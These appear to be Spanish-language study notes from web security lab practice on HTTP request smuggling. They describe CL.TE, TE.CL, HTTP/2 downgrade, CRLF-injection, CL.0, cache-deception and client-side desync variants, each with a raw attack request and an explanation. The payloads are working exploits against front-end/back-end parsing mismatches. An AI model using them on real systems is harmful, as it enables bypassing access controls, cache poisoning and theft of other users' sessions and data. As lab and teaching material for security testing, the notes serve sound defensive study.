---

---
---
## **Breve explicación:**

- HTTP Request Smuggling es una vulnerabilidad que ocurre cuando un servidor **front-end** y un servidor **back-end** interpretan de forma diferente los límites de una petición HTTP, normalmente por usar de manera distinta los encabezados `Content-Length` y `Transfer-Encoding`.
- Esto permite a un atacante **inyectar una segunda petición HTTP dentro del cuerpo de la primera**, que el back-end procesará como si fuera legítima, saltándose controles del front-end.

**Posibles objetivos del ataque:**
- Saltar autenticaciones o controles de seguridad.
- Realizar ataques de *cache poisoning*.
- Extraer datos de otros usuarios.

**Resumen de tipos:**
- **CL.TE:** El front-end interpreta la longitud del cuerpo usando `Content-Length`, mientras que el back-end usa `Transfer-Encoding`.
- **TE.CL:** El front-end interpreta usando `Transfer-Encoding` y el back-end con `Content-Length`.
- **TE.TE:** Ambos usan `Transfer-Encoding`, pero se puede inducir a uno a ignorarlo mediante técnicas de ofuscación.
-- --
## **Deteccion**
![[Pasted image 20250814174821.png]]

---
# **Casos:**


## **CL.TE**
**Request:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /error HTTP/1.1
kike: kion
```

**Explicacion:**
- El **front-end** usa `Content-Length` y considera todo el body como **un único request**.
- El **back-end** usa `Transfer-Encoding: chunked`, **corta en `0\r\n\r\n`** y trata lo que sigue como **un segundo request** (el `GET`), que el front-end **nunca validó**.
- La **segunda respuesta** puede desincronizarse y entregarse al **próximo usuario** o permitir **bypass** de controles del front-end.
*Aclaracion:*
- Si llega a aceptar **`HTTP/1.0`** podemos enviar la solicitud sin ningun header (vale la pena probarlo).
-- -
## **TE.CL**
**Request1:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Length: 4
Transfer-Encoding: chunked

38
POST /error HTTP/1.1
Content-Length: 30 

testing=test 
0

```

**Request2:**
```http
POST / HTTP/1.1
Host: domain.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Explicacion:**
- El **front-end** usa `Transfer-Encoding: chunked` y detecta el 0 como fin de la request. 
- El **back-end** usa `Content-Length` y considera que el body es **`5e\r\n`**.
- Esto genera que el **back-end** separe la request en 2 generando una desincronizacion. Esta desincronizacion se genera ya que el **Content-Length** es mayor a la data tramitada, por lo que el servidor queda en espera de los proximos bytes e incrusta los bytes obtenidos del proximo cliente que solicite el endpoint.
-- -
## **H2.TE**
**Request1:**
```http
POST / HTTP/2
Host: domain.com
Transfer-Encoding: chunked
Content-Length: 120

0

GET / HTTP/1.1
Host: domain.com
Content-Length: 12

testing=test
```

**Request2:**
```http
POST / HTTP/2
Host: domain.com
Transfer-Encoding: chunked
Content-Length: 88

0

GET / HTTP/1.1
Host: domain.com

```

**Explicacion:**
- Aprovechando que el **back-end** sigue procesando peticiones **`HTTP/1.1`** embebidas dentro de solicitudes **`HTTP/2`**, enviamos varias peticiones preparadas con un GET /x camuflado. Gracias a este desfase, logramos obtener la respuesta de otra sesión.
--- 
## **H2.CL**
**Request1:**
```http
POST / HTTP/2
Host: domain.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

test=testing
GET /error HTTP/1.1
Host: domain.com
Content-Length: 11

test=test
```

**Request2:**
```http
POST / HTTP/2
Host: domain.com
Content-Length: 0

GET /resources HTTP/1.1
Host: domain.com
Content-Length: 5

x=1
```

**Explicacion:**
- El **Front-end** Acepta **`HTTP2`** y confía en el `Content-Length`, le envio un `POST` **`HTTP2`** con body exacto y un `GET` **`HTTP/1.1`** embebido. El gateway consume *N* bytes como body y deja el `GET` smuggleado, que al reusar la conexión el **back-end** procesa primero, desincronizando respuestas.
-- -
## **H2RS via CRLF Injection**
![[Pasted image 20250819163452.png]]
**Request1:**
```http
POST / HTTP/2
Host: domain.com
Transfer-Encoding: chunked
Content-Length: 120

0

GET / HTTP/1.1
Host: domain.com
Content-Length: 12

testing=test
```

**Request2:**
```http
POST / HTTP/2
Host: domain.com
Content-Length: 0

0

POST / HTTP/1.1
Content-Length: 850
Cookie: session=sgYzrktq4DXbbDs5qTRzKqzkxgurqKek

search=test
```

**Explicacion:**
Llevamos a cabo un ataque de **HTTP/2 Request Smuggling** aprovechando una mala sanitización de cabeceras por parte del *front-end*. Usamos un vector exclusivo de **HTTP/2** basado en **inyección CRLF** dentro del valor de una cabecera, lo que nos permite introducir una cabecera `Transfer-Encoding: chunked` maliciosa y un cuerpo que termina en `0`.
- --
## **H2RS via Splitting CRLF Injection**
![[Pasted image 20250819170002.png]]
**Request:**
```http
GET / HTTP/2
Host: domain.com
```

**Explicacion:**
- Explotamos una vulnerabilidad de **request splitting** específica de **HTTP/2**, en la que el servidor no limpia correctamente los **caracteres de control** inyectados en las cabeceras. Inyectamos una secuencia **CRLF** en el valor de una cabecera para **fragmentar la petición HTTP**, *smugglear* una nueva solicitud y **envenenar la cola de respuestas**.
-- -
## **Smuggling con CL.0**
**Request:**
```http
POST /resources/images/blob.svg HTTP/1.1
Host: 0a7b004c04cb921181412f72001900ef.web-security-academy.net
Content-Length: 30


GET /error HTTP/1.1
Test: A
```
*Aclaracion:*
- Probar con la cabecer **`Host`** antes de la cabecera Test.
**
Explicacion:**
Realizamos un ataque de **request smuggling tipo CL.0**, donde el servidor *back-end* ignora el encabezado `Content-Length` en ciertas rutas, permitiendo **inyectar una segunda petición** dentro del cuerpo de una `POST` aparentemente legítima.
-- -
## **Smuggling ocultando el header TE**
**Request**
```http
POST / HTTP/1.1
Host: domain.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: invalid

38
POST /error HTTP/1.1
Content-Length: 30 

testing=test 
0

```

**Explicacion**
- Se busca lograr una inconsistencia, a veces el **back-end** al ver que hay 2 encabezados igual con valores distintos, decide ignorar los 2 e interpretar por **`Content-Length`**
-- -
## **HTTP request smuggling to perform web cache deception**
**Request1:**
```http
POST / HTTP/1.1
Host: domain.com
Transfer-Encoding: chunked
Content-Length: 38

0

GET /my-account HTTP/1.1
Test: a
```

**Request2:**
```http
GET /resources/js/tracking.js HTTP/2
Host: 0a740013030f53638047214c0098007f.web-security-academy.net
```

**Explicacion:**
- Las cookies de sesión de la víctima se aplican al `GET /my-account` smuggleado, el back-end responde con la página privada, el front-end asocia esa respuesta a la URL `/resources/js/tracking.js` y la cachea, permitiendo que el atacante luego acceda a esa URL y obtenga el contenido sensible desde la caché.
--- 
## HTTP/2 request tunnelling
![[Pasted image 20250822181550.png]]
*Aclaración:* 
- La inyeccion de este tipo de datos a veces genera que el **Front-end** revele mas data de la que deberia revelar.
![[Pasted image 20250822181959.png]]
*Aclaración:* 
- Con las cabeceras internas filtradas gracias a la primer imagen, logramos agregarlas a la nueva request embebida la cual se inyecta en la parte del nombre del header.
- Tambien vale la pena cambiar los valores de esos headers para buscar respuestas distintas por parte del servidor.
-- -
## CSD (Client Side Desync)

- Involucra 2 o más solicitudes en la misma conexión.
- La desincronización ocurre entre el cliente y el backend (no entre front y back).
- Se aprovecha de que el cliente reutiliza la conexión TCP/HTTP.
- El atacante logra que la víctima herede la request inyectada en esa conexión.
- Ignora completamente el  **`Content-Length`**
